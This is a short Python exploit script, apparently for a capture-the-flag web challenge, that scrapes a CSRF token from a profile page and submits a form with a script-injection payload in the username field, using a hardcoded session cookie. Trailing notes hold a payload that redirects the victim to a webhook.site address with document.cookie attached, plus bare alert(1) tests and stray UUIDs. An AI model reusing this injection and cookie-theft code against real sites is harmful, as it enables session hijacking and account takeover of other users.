from bs4 import BeautifulSoup
import requests

BASE_URL = "http://challenges.hackday.fr:61394"

def extract_token(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    token_element = soup.find('p', id='token-value')
    return token_element.text if token_element else None

def extract_contact_id(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    id_element = soup.find('input', {'id': 'id'})
    return id_element['value'] if id_element and 'value' in id_element.attrs else None



def register_user(token, contact_id, username, name, description, place):
    if not token:
        raise ValueError("Token not found in the HTML content")
    
    form_data = {
        'token': token,
        'id': contact_id,
        'username': username + "</pre><script>alert(1)</script><pre>",
        'name': name,
        'description': description,
        'place': place
    }

    # URL to submit the form
    url = f"{BASE_URL}/profile"

    # Submit the form via POST request
    # Submit the form with session cookies and headers
    response = requests.post(url,
        data=form_data,
        headers={
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',  # Example header
            'Content-Type': 'application/x-www-form-urlencoded',
            "Cookie": f"connect.sid=s%3Ao_1aDUNwm3UF4234nXH37dVkhklVIGNh.Lu6U9Gc2bBYAInhOeq0uhLWf8AwAdbu%2FoENuvQjPYyM"
        })

    print("Submitted Data:", form_data)
    print("Server Response:", response.status_code, response.text)
    return response





if __name__ == "__main__":
    res = requests.get(f"{BASE_URL}/profile")

    cookie = res.cookies.get('connect.sid')
    token = extract_token(res.text)
    contact_id = extract_contact_id(res.text)

    print("Extracted TOKEN:", token)
    print("Extracted ID:", contact_id)

    if token and contact_id:
        res = register_user(token, contact_id, "john", "doe", "yolo", "yoli")
        print("Final Response:", res)
    else:
        print("Failed to extract token or contact ID.")


<script>window.location.href = "https://webhook.site/ece87643-eb0f-42c6-8680-18f2b200d6fc?cookie=" + document.cookie;</script>

<script>alert(1)</script>
7506714d-a623-4174-a1f1-ab26813262e3
1c55d2bd-0001-481b-a3e1-54b00cd85f67

99050c7f-f951-46fd-a8cf-ed724f126284